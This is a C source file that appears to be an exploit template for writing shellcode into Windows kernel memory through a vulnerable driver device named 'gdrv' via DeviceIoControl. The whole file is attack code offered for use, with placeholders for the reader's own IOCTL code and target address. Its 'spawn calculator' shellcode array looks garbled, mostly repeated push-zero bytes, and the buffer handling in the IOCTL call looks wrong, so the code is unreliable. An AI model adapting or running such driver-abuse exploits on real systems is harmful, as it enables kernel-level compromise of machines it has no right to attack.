#include <windows.h>
#include <stdio.h>

#define IOCTL_WRITE_MEM 0x222003  // Replace with your vulnerable driver's IOCTL code

// Shellcode to spawn a calculator (just as an example)
unsigned char shellcode[] = {
    0x60, 0x31, 0xc0, 0x64, 0x8b, 0x40, 0x30, 0x8b, 0x40, 0x0c, 0x8b, 0x70, 0x14, 0x8b, 0x76, 0x28, 0x8b, 0x3f, 0x8b, 0x4f, 0x1c, 0x89, 0x4f, 0x18, 0x8b, 0x5f, 0x20, 0x8b, 0x4f, 0x24, 0x89, 0x4f, 0x14, 0x8b, 0x5f, 0x1c, 0x8b, 0x5f, 0x14, 0x89, 0x5f, 0x10, 0x53, 0x8b, 0x5f, 0x0c, 0x89, 0x5f, 0x0c, 0x53, 0x8b, 0x5f, 0x08, 0x89, 0x5f, 0x08, 0x53, 0x8b, 0x5f, 0x04, 0x89, 0x5f, 0x04, 0x53, 0x8b, 0x5f, 0x00, 0x89, 0x5f, 0x00, 0x53, 0x6a, 0x01, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00
};

void inject_shellcode(PVOID target_address) {
    // Write shellcode into kernel memory address
    HANDLE hDevice = CreateFileA("\\\\.\\gdrv", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to open device\n");
        return;
    }

    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_WRITE_MEM,  // Replace with IOCTL CODE!
        shellcode,
        sizeof(shellcode),
        target_address,
        sizeof(PVOID),
        &bytesReturned,
        NULL
    );

    if (result) {
        printf("[+] Shellcode injected successfully!\n");
    } else {
        printf("[-] Failed to inject shellcode\n");
    }

    CloseHandle(hDevice);
}

int main() {
    PVOID targetAddress = (PVOID)0xFFFFF78000000380;  // Example address (modify based on your system!!!!)
    inject_shellcode(targetAddress);
    return 0;
}
